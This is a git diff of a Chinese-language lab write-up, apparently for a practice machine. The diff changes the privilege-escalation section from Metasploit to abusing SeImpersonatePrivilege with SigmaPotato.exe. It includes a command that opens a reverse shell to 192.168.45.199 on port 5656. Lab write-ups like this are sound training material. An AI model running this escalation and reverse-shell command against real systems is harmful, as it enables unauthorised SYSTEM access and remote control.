@@ -33,9 +33,14 @@
   - <img width="1288" height="269" alt="image" src="https://github.com/user-attachments/assets/13dff344-b18f-4c7e-98f0-f8944abc06c1" />
 
 ## 提權
-- metasploit
-  - 成功提權成 system
-    - <img width="1920" height="670" alt="image" src="https://github.com/user-attachments/assets/b39af03d-1947-40bc-8c97-939a161be4e6" />
+- 發現可以用 SeImpersonatePrivilege 提權
+- 使用 SigmaPotato.exe 提權
+  - https://github.com/tylerdotrar/SigmaPotato
+    ```
+    .\SigmaPotato.exe --revshell 192.168.45.199 5656
+    ```
+  - <img width="1918" height="640" alt="image" src="https://github.com/user-attachments/assets/54969f38-b07e-48c2-b852-565f076840c8" />
+  - <img width="1123" height="352" alt="image" src="https://github.com/user-attachments/assets/3dc6e2bc-eb32-4b08-a284-ec696fd416e9" />
 - 取得 local.txt
   - <img width="1242" height="601" alt="image" src="https://github.com/user-attachments/assets/1e4be26c-dbcc-42e0-ad94-0e7d94134514" />
 - 取得 proof.txt
